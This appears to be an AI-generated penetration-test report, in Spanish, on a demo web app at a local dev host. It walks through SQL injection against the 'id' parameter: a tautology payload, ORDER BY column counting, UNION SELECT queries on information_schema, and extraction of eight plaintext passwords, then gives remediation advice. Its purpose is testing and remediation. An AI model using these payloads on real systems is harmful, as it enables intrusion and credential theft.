# Informe de Auditoría de Seguridad - SQL Injection
**Objetivo:** http://web.dev.local:8083  
**Fecha:** 2026-04-30T15:26:50Z  
**Modelo:** claude-sonnet-4.6  

---

## Resumen Ejecutivo

Se identificó una vulnerabilidad crítica de **SQL Injection** en el parámetro `id` del formulario de búsqueda de usuarios. La vulnerabilidad permite extraer toda la información de la base de datos, incluyendo credenciales de usuarios en texto plano.

---

## Descripción del Objetivo

La aplicación web expone un formulario de búsqueda de usuarios con un campo de entrada `id` (GET). La respuesta incluye nombre y apellido del usuario encontrado, lo que permite confirmar la extracción de datos.

---

## Vulnerabilidad Encontrada

### SQL Injection (CWE-89) — Criticidad: CRÍTICA

**Parámetro vulnerable:** `id` (método GET)  
**Tipo de inyección:** Error-based / UNION-based (in-band SQL Injection)  

**Evidencia de vulnerabilidad:**

El payload `1' OR '1'='1` devuelve todos los registros de la tabla, confirmando que la entrada del usuario se concatena directamente en la consulta SQL sin saneamiento:

```
GET /?id=1' OR '1'='1&Submit=Submit
```

Respuesta: devuelve los 8 usuarios de la base de datos.

---

## Explotación

### Paso 1 — Determinar número de columnas (ORDER BY)

```
GET /?id=1' ORDER BY 2-- &Submit=Submit  → OK (2 columnas)
GET /?id=1' ORDER BY 3-- &Submit=Submit  → Error (sin resultados)
```
→ La consulta devuelve **2 columnas**.

### Paso 2 — UNION SELECT para extracción de datos

**Base de datos y usuario actual:**
```
GET /?id=0' UNION SELECT database(),user()-- &Submit=Submit
```
Resultado:
- Base de datos: `sqli_demo`
- Usuario DB: `root@172.18.0.3`

**Tablas de la base de datos:**
```
GET /?id=0' UNION SELECT table_name,table_schema FROM information_schema.tables WHERE table_schema='sqli_demo'-- &Submit=Submit
```
Resultado: tabla `users` en esquema `sqli_demo`

**Columnas de la tabla users:**
```
GET /?id=0' UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name='users'-- &Submit=Submit
```
Columnas encontradas: `user_id`, `first_name`, `last_name`, `username`, `password`, `email`

### Paso 3 — Extracción de credenciales

```
GET /?id=0' UNION SELECT username,password FROM sqli_demo.users-- &Submit=Submit
```

**Credenciales extraídas en texto plano:**

| Username    | Password     |
|-------------|--------------|
| admin       | password123  |
| jsmith      | secret456    |
| bjohnson    | mypass789    |
| awilliams   | qwerty123    |
| cbrown      | password     |
| ddavis      | secure123    |
| emiller     | hackme       |
| fwilson     | admin123     |

---

## Impacto

- **Confidencialidad:** Exposición completa de datos de usuarios, incluyendo contraseñas en texto plano.
- **Integridad:** Posibilidad de modificar/eliminar registros con INSERT/UPDATE/DELETE si los permisos lo permiten.
- **Disponibilidad:** Posibilidad de eliminar tablas o degradar el rendimiento.
- **Privilegio elevado:** El servidor MySQL corre como `root`, lo que podría permitir acceso al sistema de ficheros (`LOAD_FILE`, `INTO OUTFILE`).

---

## Recomendaciones

1. **Usar consultas parametrizadas (Prepared Statements):** Nunca concatenar input del usuario en consultas SQL.
2. **Validar y sanitizar entradas:** Verificar que el parámetro `id` sea estrictamente numérico.
3. **Principio de mínimo privilegio:** La aplicación no debe conectarse a la base de datos como `root`.
4. **No almacenar contraseñas en texto plano:** Usar algoritmos de hash seguros (bcrypt, Argon2).
5. **Ocultar errores SQL:** No exponer detalles de errores de base de datos al usuario final.
6. **WAF:** Implementar un Web Application Firewall como capa adicional de defensa.

---

## Conclusión

La aplicación presenta una vulnerabilidad **SQL Injection crítica y explotable** que permite a un atacante no autenticado extraer todas las credenciales de usuarios almacenadas en la base de datos. La explotación fue completamente exitosa mediante técnicas UNION-based, obteniendo 8 pares usuario/contraseña en texto plano.
